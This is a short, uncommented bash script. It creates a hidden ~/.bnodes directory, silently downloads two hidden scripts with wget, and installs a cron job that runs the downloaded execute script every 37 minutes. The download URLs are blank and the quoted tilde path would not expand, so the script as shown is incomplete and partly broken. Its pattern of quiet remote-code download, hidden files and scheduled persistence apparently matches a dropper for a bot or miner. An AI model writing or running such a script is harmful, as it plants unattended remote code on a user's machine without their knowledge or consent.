#!/bin/bash

bnodes_dir="~/.bnodes"
bexecute_file="$bnodes_dir/.bexecute.sh"
buninstall_file="$bnodes_dir/.buninstall.sh"

[ ! -d "$bnodes_dir" ] && mkdir -p "$bnodes_dir"
wget -q -O "$bexecute_file" ""
wget -q -O "$buninstall_file" ""


cronjob="*/37 * * * * ~/.bnodes/.bexecute.sh"
crontab -l | grep -F "$cronjob" > /dev/null
if [ $? -eq 1 ]; then
    (crontab -l 2>/dev/null; echo "$cronjob") | crontab -
fi
